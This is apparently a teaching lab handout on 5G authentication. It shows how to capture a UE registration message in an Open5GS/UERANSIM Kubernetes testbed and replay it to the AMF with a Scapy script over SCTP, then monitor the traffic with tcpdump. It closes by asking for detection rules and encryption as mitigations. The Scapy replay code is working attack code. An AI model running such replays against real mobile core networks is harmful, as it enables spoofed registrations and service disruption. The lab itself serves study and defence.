02_06 Lab: Investigating Authentication Flows and execute Replay attack

üéØ Learning Goal

"Investigate authentication call flows through live attack simulations and packet analysis to understand replay attack and some mitigation measures
üõ†Ô∏è Prerequisites

A working Open5GS 5G Core setup (preferably in Kubernetes)

A functional UERANSIM (UE + gNB simulator)

Access to tcpdump, Wireshark, and Scapy

STEP 1 - Open the Registration messsage, and use the console to get the payload data and below information.

| Info                      | Value                 |
| ------------------------- | --------------------- |
| **AMF Pod IP**            | `10.246.198.80`       |
| **Namespace**             | `open5gs`             |
| **SCTP NodePort service** | `30412` on host IP    |
| Cluster ip      **        | `10.105.230.45:38412` |
| **Pod's SCTP port**       | `38412`               |

kubectl get pod -n open5gs -o wide | grep amf

Step 2: Craft a Scappy message to send towards AMF

from scapy.all import *
payload = bytes.fromhex("7e00417900350102f8390000010100644f8f74662c09ef0fe3554582f1fe0933704251acd1a7a12b81ef9730474cf3642b765fcafaadb64fac56dc2e04f0f0f0f0")
pkt = IP(dst="10.246.198.80") / SCTP(dport=38412, sport=3456) / Raw(load=payload)

Step 3: Execute the scappy messagage 
send(pkt)

for 10 packets use below command

for _ in range(10):
    send(pkt)

Step 4: monitor the trace message

kubectl exec -n open5gs -it open5gs-core-amf-deployment-696c8bbcdf-m8g5b -- \
  tcpdump -i any port 38412 -nn -vv

Result: You should see messages coming to the AMF POD

Can you set detection rule ? and encrypt the messages so that the attacker cannot do replay attacks ?


